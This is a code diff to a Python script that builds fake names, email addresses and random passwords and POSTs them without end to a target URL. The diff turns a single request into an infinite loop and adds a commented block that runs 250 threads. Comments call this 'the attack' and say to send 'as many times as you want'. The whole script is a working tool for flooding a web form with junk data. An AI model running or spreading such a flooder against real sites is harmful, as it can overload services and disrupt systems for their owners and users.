@@ -3,6 +3,7 @@
 import random
 import string
 import requests
+import threading
 
 #Here it's the part where the file which contains all names are read
 file = open("names.txt","r")
@@ -30,18 +31,30 @@ def get_name():
 
 """assign the variables to sent to the server. If the response is valid
 you can proceed the attack"""
-def sent_data():
-    name = get_name()
-    password = get_random_string(9) + "!"
-    provider = providers[random.randint(0,4)]
-    email = name.lower() + str(random.randint(1,2500)) + "@" + provider
+def send_data():
+    while True:
+        name = get_name()
+        password = get_random_string(9) + "!"
+        provider = providers[random.randint(0,4)]
+        email = name.lower() + str(random.randint(1,2500)) + "@" + provider
 
-    myobj = {"nombre": name,"email": email, "password": password}
-    response = requests.post(url, data = myobj)
-    print(response)
+        data = {"nombre": name,"email": email, "password": password}
+        print(data)
+        response = requests.post(url,data = data)
+        print(response)
 
-#number of loops that the post requests is executed
-loops = 1
-for i in range(0,loops):
-    print(i)
-    sent_data()
+"""After testing it works(response 200), delete "send_data()", uncomment this secction and send
+as many times as you want"""
+send_data()
+#threads = []
+#
+#for i in range(250):
+#    t = threading.Thread(target=send_data)
+#    t.daemon = True
+#    threads.append(t)
+#
+#for i in range(250):
+#    threads[i].start()
+#
+#for i in range(250):
+#    threads[i].join()
